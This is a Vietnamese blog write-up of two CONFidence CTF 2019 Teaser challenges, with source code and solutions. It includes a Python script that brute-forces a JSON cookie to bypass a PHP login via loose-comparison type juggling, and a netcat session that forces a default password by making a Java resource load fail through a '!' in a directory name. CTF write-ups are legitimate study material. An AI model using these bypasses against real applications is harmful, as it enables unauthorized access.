---
layout: post
title: CONFidence CTF 2019 Teaser
---
# CONFidence CTF 2019 Teaser
Giải do team p4 tổ chức, và tất nhiên là rất chất lượng. Nhưng là mới chỉ là Teaser thôi nên mình vẫn chưa ngập hành. 


![alt text](https://raw.githubusercontent.com/matuhn/matuhn.github.io/master/images/con1.png "CONFidence CTF 2019")

# My admin panel (WEB)
[Link Challenge](https://gameserver.zajebistyc.tf/admin/)

Vào challenge mình thấy có ngay 2 file là login.php và login.php.bak (File Backup)

![alt text](https://raw.githubusercontent.com/matuhn/matuhn.github.io/master/images/con2.png "/admin")

Nội dung file index.php.bak

```PHP
<?php

include '../func.php';
include '../config.php';

if (!$_COOKIE['otadmin']) {
    exit("Not authenticated.\n");
}

if (!preg_match('/^{"hash": [0-9A-Z\"]+}$/', $_COOKIE['otadmin'])) {
    echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n";
    exit();
}

$session_data = json_decode($_COOKIE['otadmin'], true);

if ($session_data === NULL) { echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n"; exit(); }

if ($session_data['hash'] != strtoupper(MD5($cfg_pass))) {
    echo("I CAN EVEN GIVE YOU A HINT XD \n");

    for ($i = 0; i < strlen(MD5('xDdddddd')); i++) {
        echo(ord(MD5($cfg_pass)[$i]) & 0xC0);
    }

    exit("\n");
}

display_admin();
```

Đọc hiểu code thì nó sẽ lấy giá trị của cookie `otadmin` check xem có dạng /^{"hash": [0-9A-Z\"]+}$/ hay là không
Nói dễ hiểu hơn thì cookie sẽ phải có dạng json {"hash" : "abcxyz123jj"} thì pass cái if 1 và if 2 if 3
để pass cái if thứ 4 thì cái giá trị của hash khi parse vào phải bằng với giá trị của `strtoupper(MD5($cfg_pass))`

Nếu không thể pass if 4 nó sẽ gợi ý cho mình bằng function sau 

```PHP

    for ($i = 0; i < strlen(MD5('xDdddddd')); i++) {
        echo(ord(MD5($cfg_pass)[$i]) & 0xC0);
    }
```

Output:

```
0 0 0 64 64 64 0 64 0 0 64 0 0 0 64 64 64 64 0 0 0 64 0 0 64 0 64 0 64 64 0 0
```

Sau 1 hồi nghịch ngợm với cái đống này thì mình phát hiện ra 1 điều 
Nếu `ord(MD5($cfg_pass)[$i])` return từ 0 - 63 thì `ord(MD5($cfg_pass)[$i]) & 0xC0` = 0
Còn lại thì sẽ ra 64, điều đó đồng nghĩa với việc với 1 mỗi 1 con số từ 0-9 -> sẽ có 1 số 0 
và nếu là kí tự , thì sẽ có số 64 
So sánh với Output ở trên mình sẽ có 3 giá trị đầu tiên là number , và giá trị thứ 4 là character 

Tất nhiên là không thể brute được cái cfg_pass là gì, làm gì có cái mùa xuân đó, nếu brute được thì chắc mất cả năm 
Nên mình nhìn lại toàn bộ source code 1 lần nữa thì dòng này khiến cho mình chú ý 

```PHP
if ($session_data['hash'] != strtoupper(MD5($cfg_pass)))
```

Tại sao là `!=` chứ không phải là `!==` ? PHP Type Juggling ? Trùng hợp là 3 kí tự đầu tiên lại là number 
Chắc chắn là Type Juggling 

Solution: 

```python
import requests,json
def bruteCookie(i):
    url = "https://gameserver.zajebistyc.tf/admin/login.php"
    cookie = json.dumps({
        "hash" : (i)
    })
    cookie = {"otadmin" : cookie}
    print (cookie)
    answer = requests.get(url,cookies=cookie)
    if not "I CAN EVEN " in answer.text:

        print answer.text


for i in range(1,999):
    bruteCookie(i)
```

Flag : `p4{wtf_php_comparisons_how_do_they_work}`

# Sloik (MISC)

```
nc sloik.zajebistyc.tf 30001
```
Cho 2 file source, 1 file py, 1 file jar

Source Python:

```python
import os
import shutil
import signal
import subprocess
import sys

cwd = os.getcwd()
sandbox_name = ''


def cleanup(a, b):
    global sandbox_name
    if sandbox_name != '':
        sandbox_path = os.path.join(cwd, sandbox_name)
        if os.path.exists(sandbox_path):
            shutil.rmtree(sandbox_path)


def main():
    global sandbox_name
    signal.signal(signal.SIGALRM, cleanup)
    signal.alarm(10)

    print "username: ",
    sys.stdout.flush()
    sandbox_name = sys.stdin.readline().strip()
    sandbox_path = os.path.join(cwd, "sandbox", os.path.basename(sandbox_name))

    if os.path.exists(sandbox_path):
        print "Sorry, this name is taken"
        exit(1)
    else:
        os.mkdir(sandbox_path)
        java_app = 'sloik-1.0-SNAPSHOT-jar-with-dependencies.jar'
        shutil.copy(java_app, sandbox_path)
        flag_data = open('flag.txt','r').read()
        os.chdir(sandbox_path)
        subprocess.call(['java', '-Xmx8m', '-jar', java_app], stdin=sys.stdin, stdout=sys.stdout, stderr=sys.stderr, env={'flag': flag_data})
    os.chdir("../")
    cleanup("","")


main()
```

Source Java:

```java
/* 
 * Decompiled with CFR 0.140.
 */
package team.p4.sloik;

import java.io.InputStream;
import java.io.PrintStream;
import java.util.Properties;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) {      
        Properties properties = new Properties(); 
        try {
            InputStream stream = Main.class.getResourceAsStream("/application.properties"); 
            properties.load(stream);
        }
        catch (Exception e) {
            properties.put("password", "default");
        }
        Scanner sc = new Scanner(System.in);
        System.out.println("Password:");
        String password = sc.nextLine();
        if (password.equals(properties.get("password"))) {
            System.out.println("Welcome admin, flag is: " + System.getenv("flag")); 
        }
    }
}
```

À, bài này nó cho file jar để đọc Code file jar thì mình xài [CFR](https://www.benf.org/other/cfr/)

ok nhìn vào thì khi nc tới server của nó, nó sẽ bắt mình nhập 2 thông tin là username và password
Username khi mình nhập vào nó sẽ dùng để tạo 1 folder ở server của nó, rồi copy cái file jar trên vào rồi check tiếp 
Nhìn qua file java thì nếu password trùng với password trong file config của nó thì ra flag 

```java
try {
            InputStream stream = Main.class.getResourceAsStream("/application.properties"); 
            properties.load(stream);
        }
        catch (Exception e) {
            properties.put("password", "default");
        }
```

Nhưng mà cái ở đây mình để ý là phần catch Exception, thầy dạy Java của mình ở trường đã bảo là khi code có vô số trường hợp xảy ra mà người lập trình không thể dự tính trước được thì sẽ catch lại bằng cái Exception 

Sẽ không có vấn đề gì với cái code này nếu người ra đề không phải là team p4
Thử Google 1 chút với keyword `getResourceAsStream jar throw exception report bug java` thì tìm dc [Link](https://bugs.java.com/bugdatabase/view_bug.do?bug_id=4523159) này, do team p4 report luôn
Đại loại bug này là nếu mình thêm `!` vào sau cái tên directory thì khi `getResourceAsStream` parse vào sẽ quăng Exception 
Nếu bị quăng Exception thì sao? password sẽ được set thành `default` 
```
matuhn@SE130149:/mnt/d/ctf/tool/jd-gui$ nc sloik.zajebistyc.tf 30001
username: z3r0_n1ght!
Password:
default
Welcome admin, flag is: p4{fire_exclamation_mark_fire_exclamation_mark}
```


